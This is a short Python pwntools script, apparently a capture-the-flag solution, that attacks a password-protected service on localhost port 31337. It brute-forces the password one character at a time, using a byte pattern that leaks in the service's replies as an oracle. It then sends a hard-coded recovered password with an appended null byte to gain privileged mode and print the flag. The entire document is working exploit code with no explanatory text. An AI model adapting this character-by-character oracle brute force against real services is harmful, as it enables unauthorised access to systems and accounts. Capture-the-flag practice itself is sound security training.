#!python

from pwn import *
context('i386', 'linux', 'ipv4')

def getpw():
    word = [chr(c) for c in range(0x20, 0x7F)]

    s = remote('localhost', 31337)
    # banner
    s.recvuntil('$ ')
    pw = ''

    for i in xrange(32):
        for j in word:
            payload = '%s%-32s' % (pw, j)
            s.send('enable\n') 
            rv = s.recvuntil('Please enter a password: ') 
            s.send(payload + '\n') 
            rv = s.recvuntil('$ ') 
            if rv.find('\xff\xff\xff\xff') != -1:
                pw += chr(ord(j)-1)
                break
        print "Guess: %s" % pw
    print "Password: %s" % (pw)
    return pw

s = remote('localhost', 31337)
# banner
s.recvuntil('$ ')
pw = 'bruT3m3hard3rb4by'
#pw= getpw()
s.send('enable\n')
rv = s.recvuntil('Please enter a password: ') 
s.send(pw + '\x00\n')
rv = s.recvuntil('# ')
s.send('flag\n')
print s.recvall()

